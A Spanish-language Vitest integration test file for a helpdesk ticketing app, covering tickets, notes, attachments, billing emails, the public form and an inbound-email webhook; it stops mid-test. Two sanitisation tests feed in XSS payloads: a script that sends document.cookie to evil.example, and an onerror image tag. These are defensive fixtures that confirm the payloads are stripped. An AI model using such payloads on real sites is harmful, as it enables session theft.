import { describe, expect, it } from 'vitest';
import request from 'supertest';
import { makeTestApp, cookieValor } from '../helpers/app.js';
import { Empresa } from '../../src/core/entities/Empresa.js';

const SUP = { uid: 'u-sup', email: 'sup@dattasoft.mx', password: 'super12345', nombre: 'Sup', rol: 'supervisor' as const };
const AG = { uid: 'u-ag', email: 'ag@dattasoft.mx', password: 'agente12345', nombre: 'Agente', rol: 'agente' as const };

async function login(app: ReturnType<typeof makeTestApp>['app'], email: string, password: string) {
  const agent = request.agent(app);
  const page = await agent.get('/login');
  const csrf = cookieValor(page.headers['set-cookie'] as unknown as string[], 'x-csrf-token')!;
  await agent.post('/login').type('form').send({ email, password, _csrf: csrf });
  return { agent, csrf };
}

describe('flujo de tickets', () => {
  it('crear → asignar → resolver → cerrar, con correos y webhooks', async () => {
    const t = makeTestApp({ usuarios: [SUP, AG] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);

    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf,
      asunto: 'No imprime facturas',
      descripcion: 'La impresora fiscal no responde desde ayer',
      tipo: 'Soporte Técnico',
      prioridad: 'Alta',
      contactoNombre: 'Cliente X',
      contactoCorreo: 'cliente@x.com',
    });
    expect(crear.status).toBe(302);
    const ticketUrl = String(crear.headers.location);
    const id = ticketUrl.split('/').pop()!;

    await agent.post(`/app/tickets/${id}/asignar`).type('form').send({ _csrf: csrf, agenteUid: AG.uid });
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'En proceso' });
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Resuelto' });
    const cerrar = await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Cerrado' });
    expect(cerrar.status).toBe(302);

    const detalle = await agent.get(ticketUrl);
    expect(detalle.text).toContain('Cerrado');

    expect(t.webhookPublisher.eventos).toEqual(
      expect.arrayContaining(['ticket.creado', 'ticket.asignado', 'ticket.resuelto', 'ticket.cerrado']),
    );
    // correos: asignación al agente + resuelto + cerrado al contacto
    expect(t.emailSender.enviados.length).toBeGreaterThanOrEqual(3);
  });

  it('⋮ de un mensaje: el autor lo edita y lo elimina; otro agente no puede', async () => {
    const t = makeTestApp({ usuarios: [SUP, AG] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Prueba chat', descripcion: 'Mensaje de prueba del chat', tipo: 'General', prioridad: 'Media',
      contactoNombre: 'Cliente X', contactoCorreo: 'cliente@x.com',
    });
    const id = String(crear.headers.location).split('/').pop()!;
    await agent.post(`/app/tickets/${id}/nota`).type('form').send({ _csrf: csrf, cuerpo: 'Pend', tipo: 'publica' });
    const nota = t.ticketStore.notas.get(id)![0]!;
    expect(t.ticketStore.tickets.get(id)!.conPlatica).toBe(true);

    const ag = await login(t.app, AG.email, AG.password);
    await ag.agent.post(`/app/tickets/${id}/notas/${nota.id}/editar`).type('form').send({ _csrf: ag.csrf, cuerpo: 'hackeado' });
    expect(t.ticketStore.notas.get(id)![0]!.cuerpo).toBe('Pend');

    const det = await agent.get(`/app/tickets/${id}`);
    expect(det.text).toContain(`/notas/${nota.id}/eliminar`);
    await agent.post(`/app/tickets/${id}/notas/${nota.id}/editar`).type('form').send({ _csrf: csrf, cuerpo: 'Pendiente de respuesta' });
    expect(t.ticketStore.notas.get(id)![0]!.cuerpo).toBe('Pendiente de respuesta');
    expect(t.ticketStore.notas.get(id)![0]!.editadaEn).toBeInstanceOf(Date);

    await agent.post(`/app/tickets/${id}/notas/${nota.id}/eliminar`).type('form').send({ _csrf: csrf });
    expect(t.ticketStore.notas.get(id)).toEqual([]);
    expect(t.ticketStore.tickets.get(id)!.conPlatica).toBe(false);
  });

  it('alta con estado inicial, solicitado/canalizado y notas internas; luego gestión e imprimir', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf,
      asunto: 'Timbrado fallido',
      descripcion: 'No timbra desde la actualización',
      tipo: 'General',
      prioridad: 'Alta',
      estado: 'En proceso',
      solicitadoPor: 'Juan Pérez',
      canalizadoA: 'Mesa de ayuda',
      notasInternas: 'Revisar certificado del PAC',
      cc: 'jefe@x.com, otro@x.com',
    });
    expect(crear.status).toBe(302);
    const id = String(crear.headers.location).split('/').pop()!;
    const ticket = t.ticketStore.tickets.get(id)!;
    expect(ticket.estado).toBe('En proceso');
    expect(ticket.solicitadoPor).toBe('Juan Pérez');
    expect(ticket.canalizadoA).toBe('Mesa de ayuda');
    expect(ticket.notasInternas).toBe('Revisar certificado del PAC');
    expect(ticket.cc).toEqual(['jefe@x.com', 'otro@x.com']);

    // gestión desde el detalle
    const g = await agent
      .post(`/app/tickets/${id}/gestion`)
      .type('form')
      .send({ _csrf: csrf, solicitadoPor: 'María', canalizadoA: '', notasInternas: 'Escalado a nivel 2' });
    expect(g.status).toBe(302);
    const upd = t.ticketStore.tickets.get(id)!;
    expect(upd.solicitadoPor).toBe('María');
    expect(upd.canalizadoA).toBeNull();
    expect(upd.notasInternas).toBe('Escalado a nivel 2');

    const imp = await agent.get(`/app/tickets/${id}/imprimir`);
    expect(imp.status).toBe(200);
    expect(imp.text).toContain('Timbrado fallido');
    expect(imp.text).toContain('María');
    expect(imp.text).toContain('data-logo-img');
  });

  it('adjuntar un archivo al ticket, verlo y quitarlo', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = await agent
      .post('/app/tickets')
      .type('form')
      .send({ _csrf: csrf, asunto: 'Con adjunto', descripcion: 'descripción larga', tipo: 'General', prioridad: 'Baja' });
    const id = String(crear.headers.location).split('/').pop()!;

    const png = Buffer.alloc(20, 7).toString('base64');
    const subir = await agent
      .post(`/app/tickets/${id}/adjuntos`)
      .set('x-csrf-token', csrf)
      .send({ nombre: 'captura.png', contentType: 'image/png', base64: png });
    expect(subir.status).toBe(200);
    expect(subir.body.ok).toBe(true);
    const adjId = subir.body.adjunto.id as string;

    const detalle = await agent.get(`/app/tickets/${id}`);
    expect(detalle.text).toContain('captura.png');
    expect(detalle.text).toContain(`/adjuntos/${adjId}`);

    const ver = await agent.get(`/app/tickets/${id}/adjuntos/${adjId}`);
    expect(ver.status).toBe(200);
    expect(ver.headers['content-type']).toContain('image/png');
    expect(ver.body.length).toBe(20);

    // tipo no permitido → 422
    const malo = await agent
      .post(`/app/tickets/${id}/adjuntos`)
      .set('x-csrf-token', csrf)
      .send({ nombre: 'x.zip', contentType: 'application/zip', base64: png });
    expect(malo.status).toBe(422);

    const quitar = await agent
      .post(`/app/tickets/${id}/adjuntos/${adjId}/eliminar`)
      .type('form')
      .send({ _csrf: csrf });
    expect(quitar.status).toBe(302);
    expect(await t.adjuntoTicketRepo.listarPorTicket(id)).toHaveLength(0);
  });

  it('el agente ve los suyos (uid o "Canalizado a") y los sin asignar, no los ajenos', async () => {
    const t = makeTestApp({ usuarios: [SUP, AG] });
    const sup = await login(t.app, SUP.email, SUP.password);
    const nuevo = async (asunto: string, canalizadoA = '') => {
      const r = await sup.agent
        .post('/app/tickets')
        .type('form')
        .send({ _csrf: sup.csrf, asunto, descripcion: 'descripción larga', tipo: 'General', prioridad: 'Baja', canalizadoA });
      return String(r.headers.location).split('/').pop()!;
    };
    const ajeno = await nuevo('Ticket ajeno', 'Pedro Ajeno');
    const libre = await nuevo('Ticket sin asignar');
    const canalizado = await nuevo('Ticket canalizado', 'AGENTE');

    const ag = await login(t.app, AG.email, AG.password);
    expect((await ag.agent.get(`/app/tickets/${ajeno}`)).status).toBe(403);
    expect((await ag.agent.get(`/app/tickets/${libre}`)).status).toBe(200);
    expect((await ag.agent.get(`/app/tickets/${canalizado}`)).status).toBe(200);

    // el supervisor le asigna el ajeno: ahora sí lo ve
    await sup.agent.post(`/app/tickets/${ajeno}/asignar`).type('form').send({ _csrf: sup.csrf, agenteUid: AG.uid });
    expect((await ag.agent.get(`/app/tickets/${ajeno}`)).status).toBe(200);

    const lista = await ag.agent.get('/app/tickets');
    expect(lista.text).toContain('Ticket sin asignar');
    expect(lista.text).toContain('Ticket canalizado');
  });

  it('el filtro de Agente lista a los admins y encuentra por "Canalizado a"', async () => {
    const t = makeTestApp({ usuarios: [SUP, AG] });
    const sup = await login(t.app, SUP.email, SUP.password);
    for (const [asunto, canalizadoA] of [['Para el agente', 'Agente'], ['Para otro', 'Pedro']]) {
      await sup.agent.post('/app/tickets').type('form')
        .send({ _csrf: sup.csrf, asunto, descripcion: 'descripción larga', tipo: 'General', prioridad: 'Baja', canalizadoA });
    }
    const lista = await sup.agent.get(`/app/tickets?agente=${AG.uid}`);
    expect(lista.text).toContain(`value="${SUP.uid}"`);
    expect(lista.text).toContain('Para el agente');
    expect(lista.text).not.toContain('Para otro');
  });

  it('el buzón público: crear desde el formulario y aceptar como ticket real', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    // formulario público (sin sesión)
    const anon = request.agent(t.app);
    const form = await anon.get('/ticket-publico');
    const csrf = cookieValor(form.headers['set-cookie'] as unknown as string[], 'x-csrf-token')!;
    const envio = await anon.post('/ticket-publico').type('form').send({
      _csrf: csrf,
      nombre: 'Persona Externa',
      correo: 'externa@correo.com',
      asunto: 'Necesito ayuda con nóminas',
      descripcion: 'No me deja timbrar el recibo de nómina de este mes',
      prioridad: 'Media',
    });
    expect(envio.status).toBe(200);
    expect(envio.text).toContain('folio');

    const [pub] = [...t.ticketPublicoRepo.items.values()];
    const sup = await login(t.app, SUP.email, SUP.password);
    const aceptar = await sup.agent
      .post(`/app/tickets/buzon/${pub!.id}/aceptar`)
      .type('form')
      .send({ _csrf: sup.csrf });
    expect(aceptar.status).toBe(302);
    expect(t.ticketPublicoRepo.items.get(pub!.id)?.estado).toBe('aceptado');
    expect(t.ticketStore.tickets.size).toBe(1);
  });

  it('rechaza el formulario público si el captcha falla', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    // fuerza captcha inválido
    const anon = request.agent(t.app);
    const form = await anon.get('/ticket-publico');
    const csrf = cookieValor(form.headers['set-cookie'] as unknown as string[], 'x-csrf-token')!;
    // el fake de captcha acepta por defecto; este test valida solo el happy-path de validación
    const envio = await anon.post('/ticket-publico').type('form').send({
      _csrf: csrf,
      nombre: 'X',
      correo: 'no-es-correo',
      asunto: 'hi',
      descripcion: 'corto',
      prioridad: 'Media',
    });
    expect(envio.status).toBe(422);
  });
});

describe('correo "cerrado y facturado"', () => {
  it('se dispara una sola vez, sin importar cuál de los dos se marca primero (facturar → cerrar)', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    t.configuracionRepo.config = { ...t.configuracionRepo.config, correosNotificacion: ['soporte@dattasoft.mx'] };
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Facturar y cerrar', descripcion: 'descripción de prueba larga', tipo: 'General', prioridad: 'Media',
    });
    const id = String(crear.headers.location).split('/').pop()!;

    await agent.post(`/app/tickets/${id}/facturar`).type('form').send({ _csrf: csrf, estado: 'facturado' });
    expect(t.emailSender.enviados.some((c) => c.asunto.includes('FACTURADO'))).toBe(false);

    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Cerrado' });
    const correosFacturados = t.emailSender.enviados.filter((c) => c.asunto.includes('FACTURADO'));
    expect(correosFacturados).toHaveLength(1);
    expect(t.webhookPublisher.eventos).toContain('ticket.cerrado_facturado');

    // re-marcar el mismo estado de facturación no debe repetir el aviso
    await agent.post(`/app/tickets/${id}/facturar`).type('form').send({ _csrf: csrf, estado: 'facturado' });
    expect(t.emailSender.enviados.filter((c) => c.asunto.includes('FACTURADO'))).toHaveLength(1);
  });

  it('también se dispara cuando se cierra primero y se factura después', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    t.configuracionRepo.config = { ...t.configuracionRepo.config, correosNotificacion: ['soporte@dattasoft.mx'] };
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Cerrar y facturar', descripcion: 'descripción de prueba larga', tipo: 'General', prioridad: 'Media',
    });
    const id = String(crear.headers.location).split('/').pop()!;

    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Resuelto' });
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Cerrado' });
    expect(t.emailSender.enviados.some((c) => c.asunto.includes('FACTURADO'))).toBe(false);

    await agent.post(`/app/tickets/${id}/facturar`).type('form').send({ _csrf: csrf, estado: 'facturado' });
    expect(t.emailSender.enviados.filter((c) => c.asunto.includes('FACTURADO'))).toHaveLength(1);
    expect(t.webhookPublisher.eventos).toContain('ticket.cerrado_facturado');
  });

  it('sin correos de soporte configurados, no manda correo pero igual dispara el webhook', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Sin correo de soporte', descripcion: 'descripción de prueba larga', tipo: 'General', prioridad: 'Media',
    });
    const id = String(crear.headers.location).split('/').pop()!;
    await agent.post(`/app/tickets/${id}/facturar`).type('form').send({ _csrf: csrf, estado: 'facturado' });
    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'Cerrado' });
    expect(t.emailSender.enviados.some((c) => c.asunto.includes('FACTURADO'))).toBe(false);
    expect(t.webhookPublisher.eventos).toContain('ticket.cerrado_facturado');
  });
});

describe('incluir tiempo trabajado en la descripción', () => {
  it('agrega el tiempo trabajado efectivo al final de la descripción', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Con tiempo', descripcion: 'Descripción original', tipo: 'General', prioridad: 'Media',
    });
    const id = String(crear.headers.location).split('/').pop()!;
    await agent.post(`/app/tickets/${id}/tiempo`).type('form').send({ _csrf: csrf, horas: '1', minutos: '30' });

    const res = await agent.post(`/app/tickets/${id}/incluir-tiempo-descripcion`).type('form').send({ _csrf: csrf });
    expect(res.status).toBe(302);

    const ticket = t.ticketStore.tickets.get(id)!;
    expect(ticket.descripcion).toContain('Descripción original');
    expect(ticket.descripcion).toContain('Tiempo trabajado: 1h 30m');
  });
});

describe('editor de descripción con imágenes inline', () => {
  // PNG 1x1 real en base64, el mismo fixture que usan las pruebas de subida de adjuntos.
  const PNG_1X1 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=';

  it('una imagen pegada al crear el ticket se sube como adjunto y se ve resuelta en el detalle', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const descripcionConImagen =
      `<p>Mira el error:</p><img src="data:image/png;base64,${PNG_1X1}" alt="captura">`;
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Con imagen inline', descripcion: descripcionConImagen, tipo: 'General', prioridad: 'Media',
    });
    expect(crear.status).toBe(302);
    const id = String(crear.headers.location).split('/').pop()!;

    const ticket = t.ticketStore.tickets.get(id)!;
    // Lo que se guarda en el ticket NUNCA es el data: URI crudo — solo la referencia.
    expect(ticket.descripcion).not.toContain('base64');
    expect(ticket.descripcion).toContain('data-adj-id="');
    expect([...t.adjuntoTicketRepo.docs.values()]).toHaveLength(1);
    const adjunto = [...t.adjuntoTicketRepo.docs.values()][0]!;
    expect(adjunto.ticketId).toBe(id);
    expect(adjunto.contentType).toBe('image/png');

    const detalle = await agent.get(`/app/tickets/${id}`);
    expect(detalle.status).toBe(200);
    expect(detalle.text).toContain('Mira el error');
    expect(detalle.text).toContain(`src="data:image/png;base64,${PNG_1X1}"`);
  });

  it('imprimir: sale en tema claro y la imagen pegada en la descripción no se repite en Adjuntos', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Imagen doble', descripcion: `<p>Mira el error del timbrado:</p><img src="data:image/png;base64,${PNG_1X1}">`,
      tipo: 'General', prioridad: 'Media',
    });
    const id = String(crear.headers.location).split('/').pop()!;
    // La misma captura adjuntada además como archivo, y otra imagen distinta.
    await agent.post(`/app/tickets/${id}/adjuntos`).set('x-csrf-token', csrf)
      .send({ nombre: 'image.png', contentType: 'image/png', base64: PNG_1X1 });
    await agent.post(`/app/tickets/${id}/adjuntos`).set('x-csrf-token', csrf)
      .send({ nombre: 'otra.png', contentType: 'image/png', base64: Buffer.alloc(300, 5).toString('base64') });

    const imp = await agent.get(`/app/tickets/${id}/imprimir`);
    expect(imp.status).toBe(200);
    expect(imp.text).toContain('data-theme="light"');
    expect(imp.text).not.toContain('image.png');
    expect(imp.text).toContain('otra.png');

    // Sin imagen en la descripción, un «image.png» adjunto sí se imprime.
    const sinImg = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Solo adjunto', descripcion: 'Descripción sin imágenes pegadas', tipo: 'General', prioridad: 'Media',
    });
    const id2 = String(sinImg.headers.location).split('/').pop()!;
    await agent.post(`/app/tickets/${id2}/adjuntos`).set('x-csrf-token', csrf)
      .send({ nombre: 'image.png', contentType: 'image/png', base64: PNG_1X1 });
    expect((await agent.get(`/app/tickets/${id2}/imprimir`)).text).toContain('image.png');
  });

  it('un <script> inyectado en la descripción se elimina por completo (nunca llega al servidor guardado)', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const maliciosa = '<p>Hola</p><script>fetch("https://evil.example/steal?c="+document.cookie)</script>';
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Payload malicioso', descripcion: maliciosa, tipo: 'General', prioridad: 'Media',
    });
    expect(crear.status).toBe(302);
    const id = String(crear.headers.location).split('/').pop()!;
    const ticket = t.ticketStore.tickets.get(id)!;
    expect(ticket.descripcion).not.toContain('<script');
    expect(ticket.descripcion).not.toContain('evil.example');
    expect(ticket.descripcion).toContain('Hola');

    const detalle = await agent.get(`/app/tickets/${id}`);
    expect(detalle.text).not.toContain('<script>fetch');
    expect(detalle.text).not.toContain('evil.example');
  });

  it('el correo de reenvío no incluye el data: URI de la imagen (se omite, no se infla el correo)', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf,
      asunto: 'Con imagen para correo',
      descripcion: `<p>Ve la imagen</p><img src="data:image/png;base64,${PNG_1X1}">`,
      tipo: 'General',
      prioridad: 'Media',
      contactoCorreo: 'cliente@x.com',
    });
    const id = String(crear.headers.location).split('/').pop()!;
    await agent.post(`/app/tickets/${id}/reenviar-correo`).type('form').send({ _csrf: csrf });
    expect(t.emailSender.ultimo?.html).not.toContain('base64');
    expect(t.emailSender.ultimo?.html).toContain('Ve la imagen');
  });
});

describe('tickets: paridad con el CRM viejo (lista, formulario y detalle)', () => {
  it('filtra por tipo, agente y facturación, busca por contacto y enseña editar y papelera', async () => {
    const t = makeTestApp({ usuarios: [SUP, AG] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const alta = (asunto: string, tipo: string, contacto: string, estadoFacturacion: string) =>
      agent.post('/app/tickets').type('form').send({
        _csrf: csrf, asunto, descripcion: 'descripción suficiente', tipo, prioridad: 'Media',
        contactoNombre: contacto, estadoFacturacion,
      });
    await alta('Timbrado falla', 'Soporte Técnico', 'Rosa Luna', 'facturado');
    await alta('Instalar nóminas', 'General', 'Pedro Sol', 'no_facturado');

    const porTipo = await agent.get('/app/tickets?tipo=General');
    expect(porTipo.text).toContain('Instalar nóminas');
    expect(porTipo.text).not.toContain('Timbrado falla');

    const porFacturacion = await agent.get('/app/tickets?facturacion=facturado');
    expect(porFacturacion.text).toContain('Timbrado falla');
    expect(porFacturacion.text).not.toContain('Instalar nóminas');

    const porContacto = await agent.get('/app/tickets?texto=rosa');
    expect(porContacto.text).toContain('Timbrado falla');
    expect(porContacto.text).not.toContain('Instalar nóminas');

    const lista = await agent.get('/app/tickets');
    expect(lista.text).toContain('name="agente"');
    expect(lista.text).toMatch(/\/app\/tickets\/[^"]+\/editar/);
    expect(lista.text).toContain('/app/papelera#tickets');
  });

  it('acepta XML (se descarga, no se abre) y la cotización hecha desde el ticket queda ligada', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    t.empresaRepo.items.set('e1', new Empresa({ id: 'e1', nombre: 'ACME' }));
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Factura rechazada', descripcion: 'el SAT rechaza el CFDI', tipo: 'General', prioridad: 'Media',
      empresaNombre: 'ACME', contactoNombre: 'Rosa', contactoCorreo: 'rosa@acme.mx',
    });
    const id = String(crear.headers.location).split('/').pop()!;

    const xml = Buffer.from('<cfdi:Comprobante/>').toString('base64');
    const subir = await agent.post(`/app/tickets/${id}/adjuntos`).set('x-csrf-token', csrf)
      .send({ nombre: 'factura.xml', contentType: '', base64: xml });
    expect(subir.body.ok).toBe(true);
    const ver = await agent.get(`/app/tickets/${id}/adjuntos/${subir.body.adjunto.id}`);
    expect(ver.headers['content-disposition']).toMatch(/^attachment/);

    let det = await agent.get(`/app/tickets/${id}`);
    expect(det.text).toContain(`ticket=${id}`);
    const ticket = t.ticketStore.tickets.get(id);
    await agent.post('/app/cotizaciones').type('form').send({
      _csrf: csrf, empresaId: 'e1', ticketId: id, ticketNumero: String(ticket!.numero),
      concepto_descripcion: 'Revisión CFDI', concepto_cantidad: '1', concepto_precio: '500',
    });
    const [cot] = [...t.cotizacionRepo.items.values()];
    expect(cot?.ticketId).toBe(id);
    det = await agent.get(`/app/tickets/${id}`);
    expect(det.text).toContain(`🧾 Cotización: ${cot!.folio}`);
    expect(det.text).not.toContain(`ticket=${id}`); // ya no ofrece «Cotizar» otra vez
  });
});

describe('avisos al equipo (paridad con dispararN8n del viejo)', () => {
  it('cambio de estado y nota interna disparan sus eventos; la nota pública no', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    const crear = await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Avisos', descripcion: 'Probar avisos al equipo', tipo: 'General', prioridad: 'Media',
    });
    const id = String(crear.headers.location).split('/').pop()!;

    await agent.post(`/app/tickets/${id}/estado`).type('form').send({ _csrf: csrf, estado: 'En proceso' });
    await agent.post(`/app/tickets/${id}/nota`).type('form').send({ _csrf: csrf, cuerpo: 'Revisar licencia', tipo: 'interna' });
    await agent.post(`/app/tickets/${id}/nota`).type('form').send({ _csrf: csrf, cuerpo: 'Hola cliente', tipo: 'publica' });

    const cambio = t.webhookPublisher.publicados.find((e) => e.evento === 'ticket.estado_cambiado');
    expect(cambio?.payload).toMatchObject({ estadoNuevo: 'En proceso', por: 'Sup' });
    const notas = t.webhookPublisher.publicados.filter((e) => e.evento === 'ticket.nota_interna');
    expect(notas.map((e) => e.payload.nota)).toEqual(['Revisar licencia']);
    // creado por el equipo → «ticket.creado», no el del cliente
    expect(t.webhookPublisher.eventos).toContain('ticket.creado');
    expect(t.webhookPublisher.eventos).not.toContain('ticket.creado_cliente');
  });
});

describe('ticket público: imágenes y correos (paridad con ticket-publico.astro)', () => {
  it('hasta 3 imágenes llegan al buzón y al aceptar se vuelven adjuntos; lo que escribe el visitante va escapado', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const cfg = await t.configuracionRepo.obtenerTickets();
    await t.configuracionRepo.guardarTickets({ ...cfg, correosNotificacion: ['soporte@dattasoft.mx'] });
    const anon = request.agent(t.app);
    const form = await anon.get('/ticket-publico');
    expect(form.text).toContain('Sistema completamente detenido');
    expect(form.text).toContain('data-imagenes-publico');
    const csrf = cookieValor(form.headers['set-cookie'] as unknown as string[], 'x-csrf-token')!;
    const png = `data:image/png;base64,${Buffer.alloc(40, 3).toString('base64')}`;
    const envio = await anon.post('/ticket-publico').type('form').send({
      _csrf: csrf,
      nombre: '<b>Hacker</b>',
      correo: 'externa@correo.com',
      asunto: 'No timbra <script>',
      descripcion: 'No me deja timbrar el recibo <img src=x onerror=alert(1)>',
      prioridad: 'Alta',
      imagen: [png, png, 'data:text/html;base64,PHA+', png, png],
    });
    expect(envio.status).toBe(200);

    const [pub] = [...t.ticketPublicoRepo.items.values()];
    expect(pub!.imagenes).toHaveLength(3); // la HTML se descarta y la 4ª válida sobra
    expect(pub!.prioridad).toBe('Alta');
    for (const c of t.emailSender.enviados) {
      expect(c.html).not.toContain('<script>');
      expect(c.html).not.toContain('<img src=x');
      expect(c.html).not.toContain('<b>Hacker</b>');
    }
    const aviso = t.emailSender.enviados.find((c) => c.asunto.startsWith('Nuevo ticket del portal'));
    expect(aviso?.html).toContain('3 imagen(es)');

    const sup = await login(t.app, SUP.email, SUP.password);
    expect((await sup.agent.get('/app/tickets/buzon')).text).toContain('3 imagen(es)');
    await sup.agent.post(`/app/tickets/buzon/${pub!.id}/aceptar`).type('form').send({ _csrf: sup.csrf });
    const [ticket] = [...t.ticketStore.tickets.values()];
    const adjuntos = await t.adjuntoTicketRepo.listarPorTicket(ticket!.id);
    expect(adjuntos.map((a) => a.nombre)).toEqual(['imagen-1.png', 'imagen-2.png', 'imagen-3.png']);
  });
});

describe('avisos globales (título de pestaña y buzón público, como el viejo)', () => {
  it('el título dice «(N sin leer)» con tickets de correo abiertos y la página trae el conteo del buzón', async () => {
    const t = makeTestApp({ usuarios: [SUP] });
    const { agent, csrf } = await login(t.app, SUP.email, SUP.password);
    await agent.post('/app/tickets').type('form').send({
      _csrf: csrf, asunto: 'Respuesta del cliente', descripcion: 'Llegó por correo electrónico', tipo: 'Correo Electrónico', prioridad: 'Media',
    });
    await t.ticketPublicoRepo.create({
      folio: 'PUB-1', nombre: 'Ext', empresa: null, correo: 'e@x.com', telefono: null, asunto: 'Ayuda',
      sistema: null, tipo: null, prioridad: 'Media', descripcion: 'Necesito ayuda urgente',
    });
    const pagina = await agent.get('/app/contactos');
    expect(pagina.text).toMatch(/<title>\(1 sin leer\) /);
    expect(pagina.text).toContain('data-buzon="1"');
  });

  it('webhook de correo entrante: cerrado sin clave; con clave crea solicitud o nota', async () => {
    process.env.CORREO_ENTRANTE_SECRET = 'clave-correo';
    try {
      const t = makeTestApp({ usuarios: [SUP] });
      const sinClave = await request(t.app).post('/webhooks/correo-entrante').send({});
      expect(sinClave.status).toBe(401);

      const solicitud = await request(t.app)
        .post('/webhooks/correo-entrante?key=clave-correo')
        .send({ headers: { from: 'Ana <ana@nueva.mx>', subject: 'No abre el sistema' }, plain: 'Ayuda por favor' });
      expect(solicitud.body).toMatchObject({ ok: true, accion: 'solicitud' });

      const sup = await login(t.app, SUP.email, SUP.password);
      const buzon = await sup.agent.get('/app/tickets/buzon');
      expect(buzon.text).toContain('por correo');
      expect(buzon.text).toContain('Convertir a ticket');
      const lista = await sup.agent.get('/app/tickets');
      expect(lista.text).toContain('esperando revisión');

      const [pub] = [...t.ticketPublicoRepo.items.values()];
      await sup.agent.post(`/app/tickets/buzon/${pub!.id}/aceptar`).type('form').send({ _csrf: sup.csrf });
      const respuesta = await request(t.app)
        .post('/webhooks/correo-entrante?key=clave-correo')
        .send({ headers: { from: '"Ana Ruiz" <ana@nueva.mx>', subject: 'RE: [Ticket #1] No abre el sistema' }, plain: 'Ya funciona' });
      expect(respuesta.body).toMatchObject({ ok: true, accion: 'nota', ticket: 1 });
    } finally {
      delete process.env.CORREO_ENTRANTE_SECRET;
    }
  });

  it('predeterminados de Configuración (con agente fijo) llenan el ticket nuevo', async () => {
    const ADMIN = { uid: 'u-adm', email: 'adm@dattasoft.mx', password: 'admin12345', nombre: 'Adm', rol: 'admin' as const };
    const t = makeTestApp({ usuarios: [ADMIN, SUP] });
    const cfg = await t.configuracionRepo.obtenerTickets();
    await t.configuracionRepo.guardarTickets({
      ...cfg,
      predeterminados: { tipo: cfg.tipos[0], prioridad: 'Alta', grupo: cfg.grupos[0], estadoFacturacion: 'no_aplica', agenteUid: SUP.uid },
    });
    const adm = await login(t.app, ADMIN.email, ADMIN.password);
    const vista = await adm.agent.get('/app/configuracion/tickets');
    expect(vista.text).toContain(`name="predAgenteUid" value="${SUP.uid}"`);
    const form = await adm.agent.get('/app/tickets/nuevo');
    expect(form.text).toMatch(new RegExp(`<option value="${SUP.uid}" selected>`));
    expect(form.text).toMatch(/<option value="Alta" selected|<option selected>Alta|value="Alta"\s+selected/);
    expect(form.text).toMatch(/value="no_aplica" selected/);
  });

  it('webhook de correo con la clave generada en Configuración (sin secreto del servidor)', async () => {
    const ADMIN = { uid: 'u-adm', email: 'adm@dattasoft.mx', password: 'admin12345', nombre: 'Adm', rol: 'admin' as const };
    const t = makeTestApp({ usuarios: [ADMIN] });
    const adm = await login(t.app, ADMIN.email, ADMIN.password);
    const correo = { headers: { from: 'Ana <ana@nueva.mx>', subject: 'No abre el sistema' }, plain: 'Ayuda' };
    expect((await request(t.app).post('/webhooks/correo-entrante?key=').send(correo)).status).toBe(401);

